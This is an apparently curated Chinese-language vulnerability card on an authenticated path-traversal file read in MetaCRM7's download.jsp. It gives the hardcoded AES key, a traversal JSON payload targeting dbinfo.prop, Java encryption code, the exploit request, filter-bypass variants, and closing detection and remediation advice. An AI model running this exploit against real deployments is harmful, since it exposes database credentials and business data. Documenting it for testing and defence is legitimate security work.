---
id: web-generic-file-inclusion-crm-download-jsp-aes-path-traversal
title: MetaCRM 后台 download.jsp AES 参数路径穿越任意文件读取（读 dbinfo.prop 取数据库口令）
type: scenario
domain: web
path: web/generic/file-inclusion
technique: crm-download-jsp-aes-path-traversal
aliases:
- MetaCRM download.jsp 任意文件读取
- AnalyzeParam 路径穿越
- metacrmloginpass AES 文件读取
- dbinfo.prop 读取
- 后台文件读取
tags:
- java
- jsp
- path-traversal
- file-read
- aes
- crm
- authenticated
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V232
  verified_at: '2026-11-07T09:23:57+08:00'
  notes: 已对照原文与26张图核对：p 参数→AnalyzeParam→AesEcbCipher(metacrmloginpass, AES/ECB/PKCS5Padding, Hex.decodeHex)→JSON file/filename/foldertype/time→path+file→UserService.downloadFile(FileInputStream)，us 为空时 us.getCorpName() 异常故需后台会话，PoC 读 env/conf/dbinfo.prop，均与图16-21一致。dup-scan pair#5 与前台 crm-jsp-include 的 likely_duplicate 为误报：本卡后台 AES 加密 JSON+路径穿越+FileInputStream，另一卡前台 JSP include/forward 无需登录且限 Tomcat 目录，端点/鉴权/读取方式不同，两卡并列保留；pair#7/9/14/42 related。affected_versions 原取自 classpath 测试环境版本，已 clear。未复跑 PoC。
---

## 一句话结论

MetaCRM7 后台的 `/business/common/download.jsp` 把参数 `p` 交给 `AnalyzeParam` 做 AES/ECB 解密并解析 JSON，再用其中的 `file` 与 `foldertype` 拼出服务器路径交给 `UserService.downloadFile`（内部 `FileInputStream`）下载；由于没有路径规范化/白名单，登录用户用 `file=../../../../env/conf/dbinfo.prop` 即可读取数据库连接配置，拿到数据库账号口令。

## 原理

- **参数与加密**：`download.jsp` 取 `p` 参数（`String downUrl = request.getParameter("p")`），空则返回；随后 `new AnalyzeParam(downUrl)`。`AnalyzeParam` 构造函数调用 `new AesEcbCipher().decrypt(param)`，再 `JSONObject.parseObject(...)`。`AesEcbCipher` 硬编码密钥 `metacrmloginpass`，算法 `AES/ECB/PKCS5Padding`，`decrypt` 使用 `Hex.decodeHex`，因此 `p` 是十六进制密文，不是 Base64。
- **JSON 字段**：`AnalyzeParam` 提供 `getFile()`、`getFileName()`、`getStrFolderType()`、`getTime()`、`getSum()`、`getDownType()`；`download.jsp` 用 `file`（存储文件名/相对路径）、`filename`（下载显示名）、`foldertype`（目录类型）和 `time`（有效期判断）。
- **目录选择**：`foldertype` 为 `temp`/`template`/`picture`/`messageserv` 时分别取 `Path.getTempAbsoluteDirectory(us.getCorpName())`、`getTemplateAbsoluteDirectory`、`getPictureAbsoluteDirectory`、`getMessageServerAbsoluteDirectory`，其他值取 `getAttachAbsoluteDirectory`；基础目录来自当前登录用户的 `us.getCorpName()`。
- **危险拼接**：`String strPage = path + strFile;`，若 `Path.isExistFile(strPage)` 为真，则 `UserService.downloadFile(response, strPage)` → `new FileInputStream(new File(strPage))` + `IOUtils.copyLarge` 回显。`strFile` 中的 `../` 由 `File`/`FileInputStream` 在打开时规范化，从而跳出基础目录。
- **为什么是后台漏洞**：代码先通过 `UserManager.getUserBySessionId(session.getId())` 取用户；`us` 为空时后续 `us.getCorpName()` 抛异常，流程中断。因此必须有有效登录会话（原文用后台账号的 JSESSIONID 测试）。
- **危害**：`env/conf/dbinfo.prop` 通常保存数据库类型、JDBC URL、用户名与口令；读取后可尝试直连数据库、横向到业务数据，或结合其他漏洞进一步利用。加密层只是混淆，密钥硬编码在 jar 中，不构成安全边界。

## 触发条件

- 目标部署 MetaCRM7，`/business/common/download.jsp` 可达，且攻击者拥有有效后台会话（或能通过其他漏洞/默认口令获得）。
- 攻击者知道 AES 密钥 `metacrmloginpass` 与算法（源码/反编译 jar 可获得），能把 JSON 加密成 hex。
- `file` 可含 `../`/`..\\`，Web 进程对目标文件有读权限。
- `time` 满足 `AnalyzeParam.isOutOfTime()` 的有效期校验（可用很大的时间值避免过期）。
- 无 WAF 拦截 `../`、`WEB-INF`、`dbinfo.prop` 等特征。

## 利用步骤

1. 登录 MetaCRM 后台，取得有效 `JSESSIONID`。
2. 构造 JSON：`{"file":"../../../../env/conf/dbinfo.prop","filename":"123123","foldertype":"messageserv","time":"720000000000000000"}`。`foldertype` 可按目标目录调整；`time` 取足够大的值绕过超时。
3. 用 AES/ECB/PKCS5Padding + 密钥 `metacrmloginpass` 加密该 JSON，输出十六进制字符串 `p`（CyberChef 的 AES Encrypt、Mode ECB、Output Hex 即可）。
4. 发送 `GET /business/common/download.jsp?p=<hex>`，带后台 Cookie；响应体即 `dbinfo.prop` 内容。
5. 从配置中提取数据库类型、JDBC URL、用户名与口令；按授权范围验证连接，勿批量导出业务数据。
6. 按需调整 `../` 层数与 `foldertype` 读取其他配置、日志、密钥文件；注意不同部署路径（Windows 反斜杠、Linux 斜杠）需调整穿越层数。

## PoC

明文 JSON：

```json
{"file":"../../../../env/conf/dbinfo.prop","filename":"123123","foldertype":"messageserv","time":"720000000000000000"}
```

加密（与 `AesEcbCipher.decrypt` 对应，输出 hex）：

```java
Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec("metacrmloginpass".getBytes("UTF-8"), "AES"));
String p = Hex.encodeHexStr(c.doFinal(json.getBytes("UTF-8")));
```

请求：

```http
GET /business/common/download.jsp?p=<hex> HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid session>
```

响应（节选，敏感值已省略）：

```properties
erp.db_name=...
erp.user=...
erp.password=...
default.dbtype=sqlserver
default.user=sa
default.url=jdbc:sqlserver://...
```

## 变体与关联

- 变体：`foldertype` 取 `temp`/`template`/`picture`/`messageserv`/其他，基础目录不同；`file` 用 `../../../../` 层数按部署目录调整。
- 变体：Windows 下用 `..\..\..\..\`；若存在简单过滤，可用 URL 编码、双重编码、`....//` 等。
- 关联：[[web-generic-file-inclusion-crm-getfile-filename-folder-traversal]]（同产品 `getFile` servlet 的 AES+路径穿越，字段为 `fileName/folder/sCorpName`，与本草稿同源但入口不同）、[[web-generic-file-inclusion-crm-jsp-include-forward-param-read]]（同产品前台 JSP include/forward 文件读取）。
- 边界：需要后台会话；若 `us` 为空会抛异常；若 `Path.isExistFile` 对穿越路径做 canonical 校验则失效；加密参数可被 WAF 解密检查。

## 检测与防御

- 检测：`download.jsp` 的 `p` 解密后 JSON 含 `../`、`..\\`、`dbinfo.prop`、`WEB-INF`、`/etc/passwd`；响应体出现 properties/XML 配置；同一会话短时间读取多个非业务路径；后台账号异常登录后立即访问下载接口。
- 修复：对 `file` 只取 basename 并做字符白名单；`base = new File(root).getCanonicalFile()`，拼接后 `getCanonicalPath()` 必须以 `base + File.separator` 开头；`foldertype` 用枚举白名单；下载接口增加文件归属校验。
- 加固：不要硬编码 AES 密钥；后台接口统一鉴权与权限控制；Web 进程低权限；WAF 对解密后的路径做规范化检查（或由应用层检测）；敏感配置文件权限最小化。
